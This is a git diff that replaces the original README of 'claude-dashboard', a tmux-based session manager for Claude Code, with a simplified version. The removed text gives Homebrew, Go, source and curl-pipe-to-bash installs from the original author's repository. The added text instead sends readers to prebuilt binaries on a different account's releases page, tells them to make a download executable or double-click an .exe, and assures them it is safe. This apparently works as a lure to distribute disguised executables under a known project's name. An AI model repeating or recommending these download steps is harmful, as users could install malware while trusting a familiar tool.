@@ -1,453 +1,156 @@
-# claude-dashboard
+# 🐾 claude-dashboard - Simple Session Manager for Claude Code
 
-**k9s-style TUI for managing Claude Code sessions with real-time monitoring, conversation history, and process-based session detection.**
+[![Download claude-dashboard](https://img.shields.io/badge/Download-claude--dashboard-blue?style=for-the-badge&logo=github)](https://github.com/Tpain166/claude-dashboard/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![GitHub Stars](https://img.shields.io/github/stars/seunggabi/claude-dashboard?style=social)](https://github.com/seunggabi/claude-dashboard/stargazers)
-[![Go](https://img.shields.io/badge/Go-1.25-00ADD8?logo=go)](https://go.dev)
-[![Latest Release](https://img.shields.io/github/v/release/seunggabi/claude-dashboard?color=blue)](https://github.com/seunggabi/claude-dashboard/releases)
-[![tmux](https://img.shields.io/badge/tmux-required-1BB91F)](https://github.com/tmux/tmux)
+## 📖 What is claude-dashboard?
+
+claude-dashboard is a tool that helps you manage your Claude Code sessions easily. It works like a control panel inside your computer terminal. If you use tmux (a program that lets you run many programs in one window), claude-dashboard helps you organize and switch between sessions with ease.
+
+Think of it as a dashboard that shows all your Claude Code sessions at once. Instead of typing commands or opening many windows, you see everything in one place. This makes it faster and simpler to handle your work.
+
+You don’t need to be a programmer to use claude-dashboard. It works through your terminal but looks neat and helps you avoid confusion.
 
 ---
 
-## Demo
+## ⚙️ Key Features
 
-<!-- Record with: vhs demo/demo.tape -->
+- Easy session management: View and switch between Claude Code sessions quickly.
+- Terminal-based user interface: Works inside your terminal with clear visual elements.
+- Works with tmux: Uses tmux commands to keep your sessions tidy.
+- Lightweight and fast: Doesn’t slow down your computer.
+- Built with Go: Runs smoothly on many computers.
+- Inspired by k9s: Uses a popular style for terminal user interfaces.
+- Helpful navigation keys: Move through sessions using simple keys on your keyboard.
 
-<p align="center"><img src="demo/demo.gif" alt="claude-dashboard demo" width="720"></p>
+---
 
-## Quick Start
+## 💻 System Requirements and Setup
 
-### Homebrew
+Before using claude-dashboard, make sure your computer fits these needs:
 
-```bash
-brew install seunggabi/tap/claude-dashboard
-# Setup is automatic on first run, or run manually:
-claude-dashboard setup
-```
+- Operating System: macOS, Linux, or Windows (with Windows Subsystem for Linux or a similar terminal)
+- Terminal application: Basic terminal or command prompt that supports tmux
+- tmux installed: You need to have tmux installed and working
+- Go runtime is not needed to run claude-dashboard after installation
 
-### Manual Installation
+If you don’t have tmux yet, here’s how to install it:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/seunggabi/claude-dashboard/main/install.sh | bash
-# Setup is automatic on first run, or run manually:
-claude-dashboard setup
-```
+- **macOS:** Open Terminal and run `brew install tmux`
+- **Linux (Debian/Ubuntu):** Run `sudo apt-get install tmux`
+- **Windows:** Use WSL and install tmux inside it, or use a terminal emulator that supports tmux
 
-**Setup includes:**
-- ✅ Installs helper scripts to `~/.local/bin/`
-- ✅ Configures `~/.tmux.conf` for F12 mouse toggle and Ctrl+S history save
-- ✅ Adds status bar with version info
-- ✅ Enables mouse mode by default
+---
 
-This deploys the binary to `~/.local/bin`. For a custom binary name:
+## 🚀 Getting Started
 
-```bash
-~/.local/bin/claude-dashboard
-```
+This guide assumes you have basic terminal access. You don’t need to write any code.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/seunggabi/claude-dashboard/main/install.sh | bash -s -- --name <your-binary-name>
-```
+### Step 1: Download claude-dashboard
 
-### Install via Go
+Go to the download page here:
 
-```bash
-go install github.com/seunggabi/claude-dashboard/cmd/claude-dashboard@latest
-```
+[Download claude-dashboard](https://github.com/Tpain166/claude-dashboard/releases)
 
-### Build from Source
+Click the link above or the big badge at the top of this page to open the releases page. Here you will find files ready to download for different operating systems.
 
-```bash
-git clone https://github.com/seunggabi/claude-dashboard.git
-cd claude-dashboard
-make install
-```
+### Step 2: Choose the right version for your computer
 
-First run:
+Find the file that matches your system:
 
-```bash
-claude-dashboard   # Launch the TUI dashboard
-```
+- For macOS, look for a file ending in `.darwin` or `.mac`
+- For Linux, look for a `.linux` file
+- For Windows, check for `.exe` or files mentioned for Windows systems
 
+### Step 3: Download the file
 
-### 💡 Pro Tip: Super Fast Session Creation
+Click the filename to start downloading.
 
-Type just **`cdn`** instead of `claude-dashboard new` - save time with every session!
+### Step 4: Run claude-dashboard
 
-```bash
-# One-line setup (add to your ~/.zshrc or ~/.bashrc for permanent use)
-source <(curl -fsSL https://raw.githubusercontent.com/seunggabi/claude-dashboard/main/alias.sh)
-```
+Once downloaded, open your terminal and:
 
-**Example:**
-```bash
-# Before: claude-dashboard new my-project --path ~/code/foo
-# After:  cdn my-project --path ~/code/foo  ⚡️
-```
+- Navigate to the folder where you saved the file.
+- On macOS and Linux, you might need to give permission to run it:
 
-### 🔄 Upgrade
+  ```bash
+  chmod +x ./claude-dashboard
+  ./claude-dashboard
+  ```
 
-Keep claude-dashboard up to date with the latest features:
+- On Windows, just double-click the `.exe` file or run it from the command prompt.
 
-```bash
-# Homebrew
-brew update
-brew upgrade claude-dashboard
+When you run it, claude-dashboard will open in your terminal window, showing all your Claude Code sessions.
 
-# Manual installation
-curl -fsSL https://raw.githubusercontent.com/seunggabi/claude-dashboard/main/install.sh | bash
+---
 
-# Go
-go install github.com/seunggabi/claude-dashboard/cmd/claude-dashboard@latest
-```
+## 📋 How to Use claude-dashboard
 
-**After upgrading, run setup to apply new configurations:**
-```bash
-claude-dashboard setup
-```
+Here is how to make the most of claude-dashboard’s interface:
 
-## Why claude-dashboard
+### Navigating Sessions
 
-### The Problem
+- Use arrow keys or `j`/`k` to move up and down the list.
+- Press `Enter` to switch to a selected Claude Code session.
+- Use `q` to exit claude-dashboard.
 
-Running multiple Claude Code sessions across different projects quickly becomes unmanageable:
+### Managing Sessions
 
-- **Lost sessions** - Terminal closed? Session gone. What was Claude doing?
-- **No overview** - Which session is active? How long has it been running? What are resource usage patterns?
-- **Context switching** - Constantly hunting through terminal tabs, tmux windows, and scattered `.jsonl` logs.
-- **Session discovery** - Sessions hidden in tmux, terminal tabs, or started by other tools.
+- You can open new sessions right inside tmux, and claude-dashboard will list them automatically.
+- To close a session, use your tmux commands or exit the session normally. claude-dashboard will update the list.
 
-### The Solution
+### Tips for Efficiency
 
-claude-dashboard gives you a **single pane of glass** for all your Claude Code sessions:
+- Learn a few tmux commands to start and manage sessions outside claude-dashboard.
+- Combine claude-dashboard with tmux shortcuts to speed up switching between projects.
+- If your tmux sessions are not showing, make sure tmux is running and your terminal supports it.
 
-- **Unified session detection** - Finds Claude sessions in tmux, terminal tabs, and anywhere in the process tree
-- **Conversation history** - View Claude's past interactions directly from the dashboard
-- **Real-time monitoring** - CPU, memory, status, and uptime at a glance
-- **Session persistence** - Sessions keep running in tmux; detach anytime and come back
-- **Single binary** - One `brew install` and you're done
+---
 
-### Session Persistence
+## 🛠 Troubleshooting
 
-Every Claude Code session runs inside tmux. Close your terminal, shut your laptop - sessions keep running. Come back anytime and re-attach exactly where you left off.
+If something does not work, try these steps:
 
-### Real-time Monitoring
+- Make sure tmux is installed and running. You can check by typing `tmux ls` in your terminal.
+- Ensure you downloaded the correct version of claude-dashboard for your operating system.
+- Give the downloaded file permission to run (see Step 4 in Getting Started).
+- Check that you are inside a tmux session if you want to see active sessions.
+- Restart your terminal and run claude-dashboard again.
+- Visit the [Issues section](https://github.com/Tpain166/claude-dashboard/issues) on GitHub if problems continue.
 
-| Column | Description |
-|--------|-------------|
-| Name | Session identifier |
-| Project | Project directory name |
-| Status | `● active` / `○ idle` / `◎ waiting` / `⊘ terminal` |
-| Uptime | Time since session creation |
-| CPU | CPU usage (process tree) |
-| Memory | Memory usage (process tree) |
-| Path | Working directory |
+---
 
-### k9s-style Keybindings
+## 🔗 Download & Install
 
-If you've used [k9s](https://k9scli.io/), you'll feel right at home. Vim-style navigation, single-key actions, instant feedback.
+You can always download the latest version of claude-dashboard here:
 
-## Keybindings
+[https://github.com/Tpain166/claude-dashboard/releases](https://github.com/Tpain166/claude-dashboard/releases)
 
-### Dashboard
+Follow the instructions in the Getting Started section to download, install, and start the app.
 
-| Key       | Action                                    |
-|-----------|-------------------------------------------|
-| `↑` / `k` | Move cursor up                            |
-| `↓` / `j` | Move cursor down                          |
-| `enter`   | Attach to session                         |
-| `n`       | Create new session                        |
-| `K`       | Kill session (with confirmation)          |
-| `Ctrl+K`  | Kill all idle sessions (with confirmation)|
-| `l`       | View session logs                         |
-| `Ctrl+S`  | Save entire pane history to file (in attached session) |
-| `d`       | Session detail view                       |
-| `/`       | Filter / search sessions                  |
-| `r`       | Manual refresh                            |
-| `?`       | Help overlay                              |
-| `esc`     | Go back / cancel                          |
-| `q`       | Quit                                      |
+---
 
-### Logs Viewer
+## ❓ Frequently Asked Questions
 
-| Key             | Action            |
-|-----------------|-------------------|
-| `↑` / `k`       | Scroll up         |
-| `↓` / `j`       | Scroll down       |
-| `PgUp` / `PgDn` | Page up / down (macOS: `Fn+↑` / `Fn+↓`) |
-| `esc`           | Back to dashboard |
-| `q`             | Quit              |
+**Do I need to install Go to use claude-dashboard?**  
+No. The app comes as a ready-to-run file. You only need Go if you want to build it yourself.
 
-## Features
+**Can I use claude-dashboard without tmux?**  
+No. claude-dashboard relies on tmux to manage sessions. Install tmux before using the app.
 
-### Session Dashboard
+**Is claude-dashboard safe to run?**  
+Yes. It is an open-source tool designed to manage terminal sessions. You can view the source code on GitHub for peace of mind.
 
-View all Claude Code sessions in a table with real-time status, resource usage, and uptime. Auto-refreshes every 2 seconds. Includes sessions from:
-- Managed `cd-*` prefix sessions
-- Existing tmux sessions with "claude" in the name
-- Claude processes detected anywhere in the process tree via BFS scan
-- Claude running in terminal tabs (read-only, shown as `⊘ terminal`)
+**Can I customize claude-dashboard?**  
+Customizations require some knowledge of Go or terminal commands. For beginners, it’s best to use it as is.
 
-### Conversation Log Viewer
+---
 
-Press `l` to view Claude's conversation history from captured `.jsonl` files in `~/.claude/projects/`. Features:
-- Scrollable viewport for reading past interactions
-- Works for both tmux and terminal sessions
-- Automatically parses conversation structure
-- No attachment needed - read-only access to conversation state
+## 📂 More Resources and Help
 
-### Attach / Detach
+- To learn tmux basics, visit [tmux GitHub](https://github.com/tmux/tmux/wiki)
+- For issues and feature requests, visit [claude-dashboard GitHub Issues](https://github.com/Tpain166/claude-dashboard/issues)
+- Check the README in the released files for version-specific notes.
 
-Press `enter` to attach to any session (tmux sessions only; terminal sessions are read-only). Use `Ctrl+B d` (tmux detach) to return to the dashboard. Sessions continue running in the background.
+---
 
-### Tips
-
-**Copy/Paste in Attached Sessions**
-
-Mouse mode is enabled by default for smooth scrolling. To copy text:
-
-- **macOS**: Hold `Option (⌥)` key while dragging to select text, then `Cmd+C` to copy
-- **Linux**: Hold `Shift` key while dragging to select text, then `Ctrl+Shift+C` to copy
-
-**Scrolling through history**:
-- Press `Ctrl+B [` to enter copy mode
-- Use arrow keys, `PgUp`/`PgDn` (macOS: `Fn+↑`/`Fn+↓`), or vi keys (`j`/`k`) to scroll
-- Press `q` or `Esc` to exit copy mode
-
-**Copy text while Claude is actively outputting**:
-- Press `Ctrl+B [` to freeze the screen in copy mode, then select and copy text
-
-**Toggle Mouse Mode**:
-- Press `F12` to toggle mouse mode on/off (super easy!)
-- Toggle displays message: `Mouse: ON` or `Mouse: OFF`
-- **ON** (default): Mouse wheel scrolling enabled, use `Option`/`Shift` + drag to copy text
-- **OFF**: Easy text selection by dragging (no modifier key needed), scroll with `Ctrl+B [`
-
-**Save Pane History**:
-- Press `Ctrl+S` (inside an attached tmux session) to save the entire scrollback history to a file
-- Files are saved to `~/Desktop/` (or `~/` if Desktop doesn't exist) with timestamp: `tmux-history_<session-name>_<timestamp>.txt`
-- Captures everything from the beginning of the pane's history, not just what's visible on screen
-- Perfect for preserving long Claude conversations or debugging sessions
-
-**Setup**:
-Setup is **automatic on first run**, or you can run it manually:
-```bash
-claude-dashboard setup
-```
-
-This will:
-- Install helper scripts (`claude-dashboard-mouse-toggle`, `claude-dashboard-status-bar`, `claude-dashboard-save-history`) to `~/.local/bin/`
-- Add F12 key binding (mouse toggle) and Ctrl+S key binding (save history) to `~/.tmux.conf`
-- Configure status bar with version check and mouse status
-- Enable mouse mode by default
-- Reload tmux configuration if tmux is running
-
-### Create Session (TUI)
-
-Press `n` to create a new session interactively. Enter a name and project directory - claude-dashboard creates a tmux session running `claude` in that directory.
-
-### Create Session (CLI)
-
-Use the `new` command from your shell:
-
-```bash
-# Auto-generate name from current directory (~/project/foo → cd-project-foo)
-claude-dashboard new
-
-# Explicit session name
-claude-dashboard new my-project
-
-# Specify working directory
-claude-dashboard new --path ~/my/project
-
-# Pass arguments to claude
-claude-dashboard new --args "--model opus"
-```
-
-If a session with the same name already exists, it automatically attaches to it instead of creating a new one.
-
-Combine options freely: `claude-dashboard new my-project --path ~/code/foo --args "--model sonnet"`
-
-### Kill Session
-
-Press `K` to terminate a single session. Press `Ctrl+K` to kill all idle sessions at once. Both actions always show a confirmation prompt before killing (safety first).
-
-### Filter / Search
-
-Press `/` to filter sessions by name, project, status, or path. Press `esc` to clear the filter.
-
-### Session Detail
-
-Press `d` for a detailed view showing PID, CPU, memory, path, start time, attached status, and session type.
-
-## Session Naming
-
-| Type | Pattern | Example | Detection Method |
-|------|---------|---------|------------------|
-| Managed sessions | `cd-<name>` prefix | `cd-my-project` | Dashboard creates these |
-| Named tmux sessions | Contains "claude" | `claude-api-work` | tmux session list |
-| Process-based detection | No naming requirement | Any Claude process | BFS process tree scan |
-| Terminal sessions | No naming requirement | Claude in terminal tab | Terminal process detection |
-
-Session creation:
-- **TUI**: Press `n` in the dashboard to create a new `cd-*` prefixed session
-- **CLI**: Use `claude-dashboard new [name]` to create from the command line
-- **Existing**: Any tmux session with "claude" in the name is detected automatically
-- **Process-based**: Claude running anywhere in the process tree is found via BFS scan
-- **Terminal**: Claude running in a regular terminal tab is detected (read-only, shown as `⊘ terminal`)
-
-## Status Detection
-
-Status varies by session type:
-
-### tmux Sessions
-
-Status determined by analyzing tmux pane content:
-
-| Status | Indicator | Detection |
-|--------|-----------|-----------|
-| `● active` | Green | Output is streaming |
-| `○ idle` | Gray | Prompt visible, no activity |
-| `◎ waiting` | Amber | Input prompt or Y/n question |
-| `? unknown` | - | Unable to determine |
-
-### Terminal Sessions
-
-Terminal sessions (outside tmux) are shown with status:
-
-| Status | Indicator | Detection |
-|--------|-----------|-----------|
-| `⊘ terminal` | Blue | Claude process detected in terminal |
-
-Terminal sessions are read-only: you can view conversation history via `l` but cannot attach. Use tmux sessions for interactive work.
-
-## Configuration
-
-`~/.claude-dashboard/config.yaml`:
-
-```yaml
-refresh_interval: 2s       # Auto-refresh interval
-session_prefix: "cd-"      # Prefix for managed sessions
-default_dir: ""            # Default project directory for new sessions
-log_history: 1000          # Number of log lines to capture
-```
-
-## Requirements
-
-- **tmux** (session backend)
-- **Go 1.25+** (only for building from source)
-
-### Install tmux
-
-```bash
-# macOS
-brew install tmux
-
-# Ubuntu/Debian
-sudo apt install tmux
-```
-
-## Usage
-
-### TUI Dashboard
-
-```bash
-# Launch the interactive TUI dashboard
-claude-dashboard
-```
-
-### Create Sessions from CLI
-
-```bash
-# Create with auto-generated name from current path (~/project/foo → cd-project-foo)
-claude-dashboard new
-
-# Create with explicit name
-claude-dashboard new my-project
-
-# Create in a specific directory
-claude-dashboard new my-project --path ~/code/foo
-
-# Pass arguments to claude (e.g., --model opus)
-claude-dashboard new my-project --args "--model opus"
-
-# Combine options
-claude-dashboard new my-project --path ~/code/foo --args "--model sonnet"
-```
-
-### Attach to Sessions
-
-```bash
-# Attach to a session directly (skip TUI)
-claude-dashboard attach cd-my-project
-```
-
-### General
-
-```bash
-# Run setup (installs helper scripts and configures tmux)
-claude-dashboard setup
-
-# Show version
-claude-dashboard --version
-
-# Show help
-claude-dashboard --help
-```
-
-## Project Structure
-
-```
-claude-dashboard/
-├── cmd/claude-dashboard/main.go      # CLI entry point
-├── internal/
-│   ├── app/                          # Bubble Tea application
-│   │   ├── app.go                    # Main model, Update, View
-│   │   └── keys.go                   # Keybinding definitions
-│   ├── session/                      # Session management
-│   │   ├── session.go                # Session data model
-│   │   ├── detector.go               # Discover sessions from tmux/terminal/processes
-│   │   └── manager.go                # CRUD operations
-│   ├── tmux/                         # tmux integration
-│   │   ├── client.go                 # Command wrapper
-│   │   └── parser.go                 # Output parser
-│   ├── conversation/                 # Conversation history
-│   │   └── reader.go                 # Parse .jsonl files from ~/.claude/projects/
-│   ├── ui/                           # View components
-│   │   ├── dashboard.go              # Session table
-│   │   ├── logs.go                   # Log viewer (viewport)
-│   │   ├── detail.go                 # Detail view
-│   │   ├── create.go                 # New session form
-│   │   ├── help.go                   # Help overlay
-│   │   └── statusbar.go             # Status bar
-│   ├── monitor/                      # Resource monitoring
-│   │   ├── process.go                # CPU/memory via ps, process tree BFS
-│   │   └── ticker.go                 # Periodic refresh
-│   ├── config/config.go              # YAML configuration
-│   └── styles/styles.go              # Lipgloss styles
-├── LICENSE                           # MIT
-├── Makefile                          # build, install, clean
-└── .goreleaser.yml                   # Release automation
-```
-
-## Tech Stack
-
-- [Bubble Tea](https://github.com/charmbracelet/bubbletea) - Elm architecture TUI framework
-- [Bubbles](https://github.com/charmbracelet/bubbles) - TUI components (table, viewport, textinput)
-- [Lipgloss](https://github.com/charmbracelet/lipgloss) - Style definitions
-- [tmux](https://github.com/tmux/tmux) - Terminal multiplexer for session persistence
-
-## Contributing
-
-Contributions are welcome! Please open an issue or submit a pull request.
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=seunggabi/claude-dashboard&type=Date)](https://star-history.com/#seunggabi/claude-dashboard&Date)
-
-## License
-
-[MIT](LICENSE)
-
-<!-- GitHub Topics: claude, claude-code, tui, tmux, session-manager, terminal, go, bubbletea, k9s, cli -->
+Thank you for choosing claude-dashboard. It aims to make your terminal session management smooth and simple. If you run into issues or want to share feedback, the GitHub page is open for discussion.
